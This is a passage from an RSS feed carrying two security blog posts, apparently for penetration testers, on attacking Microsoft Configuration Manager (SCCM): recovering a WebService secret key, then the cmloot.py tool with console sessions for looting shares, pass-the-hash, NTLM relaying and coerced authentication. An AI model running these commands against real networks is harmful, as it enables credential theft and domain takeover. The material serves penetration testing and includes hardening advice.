+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;Extracting archive: 007F-winpe_dotnet.XYZ00006.wim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[...]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After this we just extract the key from the config-file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/CMLootOut$ cat sms/PKG/SMS10000/OSDFrontEnd.exe.config | grep SecretKey -A1
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &amp;lt;setting name=&amp;#34;WebServiceSecretKey&amp;#34; serializeAs=&amp;#34;String&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &amp;lt;value&amp;gt;134ef495-4991-41df-9fa3-27c1a736de85&amp;lt;/value&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;more-recon-3&#34;&gt;More recon #3&lt;/h2&gt;
+&lt;p&gt;OK, so what if the administrator restricts permissions on the &lt;code&gt;SCCMContentLib$&lt;/code&gt;
+(Actually don&amp;rsquo;t know if this is supported). No problem, you can download the &lt;code&gt;.wim&lt;/code&gt;
+files directly from the Configuration Manager PXE server but only if Configuration i
+Manager is using WDS for the PXE services.&lt;/p&gt;
+&lt;p&gt;According to TFTP&amp;rsquo;s &lt;a href=&#34;https://www.rfc-editor.org/rfc/rfc1350&#34;&gt;RFC&lt;/a&gt; you cannot list
+directories or files which means you need to guess the file names
+for the &lt;code&gt;.wim&lt;/code&gt; files. Luckily, &lt;code&gt;cmloot.py&lt;/code&gt; did this for us in the previous example.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ cat sccmfiles.txt | grep -i winpe
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00006.9\winpe_dotnet.XYZ00006.wim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00007.3\winpe.XYZ00007.wim
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ atftp 100.64.5.221 69 -l winpe_dotnet.XYZ00006.wim -g -r &amp;#39;SMSImages\\XYZ00006\\winpe_dotnet.XYZ00006.wim&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;user@adpen1:~$ file winpe_dotnet.XYZ00006.wim
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;winpe_dotnet.XYZ00006.wim: Windows imaging (WIM) image v1.13, bootable no. 1, LZX compressed, reparse point fixup
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If the Configuration Manager PXE use &lt;code&gt;sccmpxe.exe&lt;/code&gt; as opposed to WDS PXE this does
+not work as the WinPE file location is dynamically generated during the PXE process, and
+does not rely on static paths.&lt;/p&gt;
+&lt;h2 id=&#34;conclusions-and-recommendations&#34;&gt;Conclusions and Recommendations&lt;/h2&gt;
+&lt;p&gt;As we&amp;rsquo;ve seen in this blog post there are several exploitation paths that could
+be used by an attacker depending on how the service account is configured. We&amp;rsquo;ve also
+seen that keeping the &lt;code&gt;WebServiceSecretKey&lt;/code&gt; can be a bit of a challenge if the
+&lt;em&gt;ConfigMgr WebService&lt;/em&gt; is in use.&lt;/p&gt;
+&lt;p&gt;As some of the methods to obtaining the &lt;code&gt;WebServiceSecretKey&lt;/code&gt; without being authenticated in the
+Active Directory domain exist these can serve as an initial access vector on a internal network.&lt;/p&gt;
+&lt;p&gt;To limit the exploitation it is recommended to use the principle of least privilege
+on the service account, ensuring that the minimal permissions possible are given.&lt;/p&gt;
+&lt;p&gt;A shortlist of what to avoid can be:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;To &lt;strong&gt;not&lt;/strong&gt; include the service account in highly privileged groups.&lt;/li&gt;
+&lt;li&gt;To limit the ability for the service account to add users and computers to groups or modify objects other than a limited set of allowed entities.&lt;/li&gt;
+&lt;li&gt;Limit the ability for the usage of SetADComputerManagedBy if RODCs are used in the environment.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;note-from-the-developer&#34;&gt;Note from the developer&lt;/h2&gt;
+&lt;p&gt;&lt;em&gt;ConfigMgr WebService&lt;/em&gt; last release was back in 2019 and has since stopped developing. The
+developer is considering the project legacy and recommends not to use it.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Introducing cmloot.py - New tooling for attacking Configuration Manager</title>
+      <link>https://www.shelltrail.com/research/cmloot/</link>
+      <pubDate>Sun, 24 Sep 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.shelltrail.com/research/cmloot/</guid>
+      <description>&lt;h1 id=&#34;tldr&#34;&gt;TL;DR&lt;/h1&gt;
+&lt;p&gt;The newly released &lt;code&gt;cmloot.py&lt;/code&gt; tool allows you to do all the stuff you love
+from CMLoot, but with enhanced capabilities, such as relaying and PtH.. and of
+course it runs natively on Linux.&lt;/p&gt;
+&lt;p&gt;Github: &lt;a href=&#34;https://github.com/shelltrail/cmloot&#34;&gt;https://github.com/shelltrail/cmloot&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Follow us on Linkedin for more security related information: &lt;a href=&#34;https://www.linkedin.com/company/shelltrail&#34;&gt;https://www.linkedin.com/company/shelltrail&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;background&#34;&gt;Background&lt;/h1&gt;
+&lt;p&gt;Configuration Manager is absolutely the new black in terms of security
+research as many new techniques and attacks have surfaced lately and showed that
+the complex nature of Configuration Manager may become a security risk for
+companies. As Configuration Manager runs in most organizations it is well spent
+time to learn both how to attack and defend this service.
+As an icing on the cake, Configuration Manager usually contains high privileged
+accounts or accounts with implicit high privileges, which makes Configuration
+Manager a lucrative target for attackers (and pentesters).&lt;/p&gt;
+&lt;p&gt;Configuration Manager is a software developed by Microsoft which helps organizations
+to automatically deploy operating systems and software. Being tightly integrated
+in Active Directory requires the server to store credentials for various services,
+some of which have high privileges. Most often the Configuration Manager server will
+have the ability to install agents on all Windows machines it manages, which requires
+local administrative privileges on each target. This means that a compromise of
+Configuration Manager could lead to lateral movement to a multitude of systems.&lt;/p&gt;
+&lt;p&gt;Before diving in to the tooling and the extended features, a bigshout out to
+Tomas Rzepka who is the inspiration behind this tool with his own
+&lt;a href=&#34;https://github.com/1njected/CMLoot/&#34;&gt;CMLoot&lt;/a&gt;,
+which have generated multiple domain compromise paths. Cheers!&lt;/p&gt;
+&lt;h1 id=&#34;presenting-cmlootpy&#34;&gt;Presenting: cmloot.py&lt;/h1&gt;
+&lt;p&gt;Much like Tomas Rzepka&amp;rsquo;s Powershell version, &lt;code&gt;cmloot.py&lt;/code&gt; is built to aid penetration
+testers to search and find
+sensitive files in Configuration Manager&amp;rsquo;s complex file share structure.
+&lt;code&gt;cmloot.py&lt;/code&gt; is written in python and takes advantage of Impacket&amp;rsquo;s&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt; SMB protocol
+implementation which
+enables all practical features gained from the SMB classes such as pass-the-hash,
+Kerberos, SOCKS supports and all stunts possible with NTLM-relaying.&lt;/p&gt;
+&lt;p&gt;Before being able to test the possibilities of &lt;code&gt;cmloot.py&lt;/code&gt; you need to find a Configuration
+Manager server or Configuration Manager Distribution Point which shares the &lt;code&gt;SCCMContentLib$&lt;/code&gt;
+folder.
+This share is reachable by default with only &lt;code&gt;Domain Users&lt;/code&gt; or &lt;code&gt;Domain Computers&lt;/code&gt;
+membership.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;pentester-browsing-configuration-manager-shares.png&#34; alt=&#34;sccmcontentlib_share&#34; title=&#34;Picture showing pentester browsing Configuration Manager shares&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This share in turn contains three folders, DataLib, FileLib and PkgLib.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;exposed-shares-during-active-directory-security-assessment.png&#34; alt=&#34;shares&#34; title=&#34;Picture showing exposed shares during Active Directory security assessment&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The shares combined, creates a complex file structure which is
+optimized and scalable for large Configuration Manager
+installations with servers deployed world wide.&lt;/p&gt;
+&lt;p&gt;The reason for being complex and in turn scalable is that the DataLib folder only stores
+&lt;code&gt;.INI&lt;/code&gt;-files which contains hash values for the
+real file. The real file can be found in the FileLib where it is stored in a folder named after
+the first four characters of the hash value.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;configuration-manager-datalib-files-during-a-penetration-test.png&#34; alt=&#34;datalib&#34; title=&#34;Picture showing datalib files during a penetration test&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;configuration-manager-filelib-files-during-a-penetration-test.png&#34; alt=&#34;filelib&#34; title=&#34;Picture showing filelib files during a penetration test&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;files-manually-downloaded-from-sccm-share-during-pentest.png&#34; alt=&#34;downloaded&#34; title=&#34;Picture showing files manually downloaded from SCCM share during pentest&#34;&gt;&lt;/p&gt;
+&lt;p&gt;If you are attempting to search and download multiple files this becomes tedious work.
+&lt;code&gt;cmloot.py&lt;/code&gt; automates this by building an inventory of all files stored in the
+DataLib share, which is then used as a reference for the files that can be downloaded.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootinventory sccmfiles.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Access to SCCMContentLib
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] sccmfiles.txt created
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;user@adpen1:~/cmloot$ cat sccmfiles.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\cmi2migxml.dll
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\Config_AppsAndSettings.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\Config_AppsOnly.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\Config_SettingsOnly.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\\sccm01\SCCMContentLib$\DataLib\XYZ00001.1\amd64\csiagent.dll
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[...]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next up you specify the file extensions of the files that should be downloaded.
+By default this is &lt;code&gt;.INI&lt;/code&gt;, &lt;code&gt;.XML&lt;/code&gt; and &lt;code&gt;.CONFIG&lt;/code&gt;. The downloaded files will be
+stored in a folder called &lt;code&gt;CMLootOut&lt;/code&gt; if nothing else is specified..&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootdownload sccmfiles.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Extensions to download [&amp;#39;XML&amp;#39;, &amp;#39;INI&amp;#39;, &amp;#39;CONFIG&amp;#39;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Creating CMLootOut
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded D204-Config_AppsAndSettings.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 32AF-Config_AppsOnly.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded B852-Config_SettingsOnly.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded C7F4-MigApp.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded CF90-MigDocs.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded E67A-MigUser.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded F906-ep_defaultpolicy.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;user@adpen1:~/cmloot$ ls CMLootOut/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;32AF-Config_AppsOnly.xml      D204-Config_AppsAndSettings.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;B852-Config_SettingsOnly.xml  E67A-MigUser.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C7F4-MigApp.xml               F906-ep_defaultpolicy.xml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CF90-MigDocs.xml
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Files that commonly appear on a Configuration Manager server that will help
+you carve your way to Domain Admin is &lt;code&gt;unattend.xml&lt;/code&gt; and &lt;code&gt;CustomSettings.ini&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;unattend.xml&lt;/code&gt; usually stores the domain-join account username and password where
+the highlighted risks with the exposure of this account can be read in this article:
+&lt;a href=&#34;https://viksafe.com/post/2022/12/19/active-directory-domain-ownjoin-accounts/&#34;&gt;Active Directory domain (own)join accounts&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;CustomSettings.ini&lt;/code&gt; can be used much as the &lt;code&gt;unattend.xml&lt;/code&gt; for domain join actions with the fun
+addition that the username and password will be stored in the key &lt;code&gt;DomainAdmin=&lt;/code&gt; and &lt;code&gt;DomainAdminPassword=&lt;/code&gt;
+(Do not get to excited by the naming, you should be lucky/unlucky if you gain Domain Admin
+credentials from this file depending on what side of the attack you are.)&lt;/p&gt;
+&lt;p&gt;While these features are in line with the previously released tool for powershell,
+&lt;code&gt;cmloot.py&lt;/code&gt; adds some interesting new features to further extend the exploitability
+of Configuration Manager. Let&amp;rsquo;s have a look at these in the following examples.&lt;/p&gt;
+&lt;h1 id=&#34;examples&#34;&gt;Examples&lt;/h1&gt;
+&lt;p&gt;Pass-the-hash with a user account:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB -hashes 0:981f69b7d59d4cc73d1ee05b98981e9c
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Extensions to download [&amp;#39;CAB&amp;#39;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 1A6D-ccmsetup.cab
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Pass-the-hash computer account:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ python3 cmloot.py test.local/DEMOMACHINE\$@sccm01 -cmlootdownload sccmfiles.txt -extensions CAB -hashes 0:de22a35159cdf85a91db9a67d08f383a
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[+] Extensions to download [&amp;#39;CAB&amp;#39;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 1A6D-ccmsetup.cab
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Could you use it with proxychains and a Cobalt Strike SOCKS5 beacon? I&amp;rsquo;m glad you asked&amp;hellip;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/cmloot$ proxychains python3 cmloot.py TEST.LOCAL/TEST-LOWPRIV@sccm01 -n -cmlootdownload sccmfiles.txt -extensions CAB
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ProxyChains-3.1 (http://proxychains.sf.net)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-100.64.5.221:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Extensions to download [&amp;#39;CAB&amp;#39;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 1A6D-ccmsetup.cab
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[+] Already downloaded 0BEF-microsoft.webview2.fixedversionruntime.x86.cab
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With NTLM-relaying? Of course!&lt;/p&gt;
+&lt;p&gt;Start a &lt;code&gt;ntlmrelay.py&lt;/code&gt; instance:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ ntlmrelayx.py -socks -t 100.64.5.221 -smb2support --no-http-server --no-wcf-server --no-raw-server  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;[*] Servers started, waiting for connections
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Type help for list of commands
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ntlmrelayx&amp;gt;  * Serving Flask app &amp;#39;impacket.examples.ntlmrelayx.servers.socksserver&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; * Debug mode: off
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Trigger SMB interaction for example with MS-RPRN FindFirstRprinter
+via &lt;code&gt;dementor.py&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~/tools$ python3 dementor.py 100.64.5.25 DEMOMACHINE -u test-lowpriv -p Spettekaka1 -d test.local
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] connecting to DEMOMACHINE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] bound to spoolss
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] getting context handle...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] sending RFFPCNEX...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[-] exception RPRN SessionError: code: 0x6ab - RPC_S_INVALID_NET_ADDR - The network address is invalid.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[*] done!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;SOCKS sessions is now available from &lt;code&gt;ntlmrelayx.py&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ntlmrelayx&amp;gt; finished_attacks
